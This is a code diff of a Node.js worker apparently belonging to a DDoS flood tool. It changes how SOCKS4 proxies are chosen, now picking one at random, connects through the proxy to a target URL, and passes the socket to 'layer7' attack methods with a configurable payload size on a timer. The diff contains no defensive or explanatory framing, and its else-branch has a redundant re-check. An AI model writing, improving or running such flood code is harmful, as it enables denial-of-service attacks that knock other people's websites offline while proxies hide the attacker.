@@ -3,50 +3,50 @@ const { SocksClient } = require('socks');
 const layer7 = require('./methods/layer7');
 const fs = require('fs');
 
-const validSocks5Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
+const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
 
 if (!isMainThread) {
     const { targetUrl, delay, kbSize, method } = workerData;
     const target = new URL(targetUrl);
 
-    let proxyIndex = 0;
-
-    function getNextProxy() {
-        const proxy = validSocks5Proxies[proxyIndex];
-        proxyIndex = (proxyIndex + 1) % validSocks5Proxies.length; 
-        return proxy;
-    }
-
     setInterval(() => {
-        const proxy = getNextProxy();
+        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];
         const [proxyIp, proxyPort] = proxy.split(':');
 
-        const options = {
-            proxy: {
-                ipaddress: proxyIp,
-                port: parseInt(proxyPort),
-                type: 4, 
-            },
-            destination: {
-                host: target.hostname,
-                port: target.port || (target.protocol === 'https:' ? 443 : 80),
-            },
-            command: 'connect',
-            timeout: 5000, 
-        };
+        if (layer7[method]) {
+            const options = {
+                proxy: {
+                    ipaddress: proxyIp,
+                    port: parseInt(proxyPort),
+                    type: 4, // SOCKS4
+                },
+                destination: {
+                    host: target.hostname,
+                    port: target.port || (target.protocol === 'https:' ? 443 : 80),
+                },
+                command: 'connect',
+                timeout: 5000,
+            };
 
-        SocksClient.createConnection(options, (err, info) => {
-            if (err) {
-                console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
-                return;
-            }
+            SocksClient.createConnection(options, (err, info) => {
+                if (err) {
+                    console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
+                    return;
+                }
 
-            if (info && info.socket) {
-                layer7[method](info.socket, target, kbSize); 
+                if (info && info.socket) {
+                    layer7[method](info.socket, target, kbSize);
+                } else {
+                    console.error(`LDS: Socket not initialized for ${targetUrl}`);
+                }
+            });
+        } else {
+            if (layer7[method]) {
+                layer7[method](null, target, kbSize);
             } else {
-                console.error(`LDS: Socket not initialized for ${targetUrl}`);
+                console.error(`LDS: Method ${method} not found.`);
             }
-        });
+        }
     }, delay);
 }
 
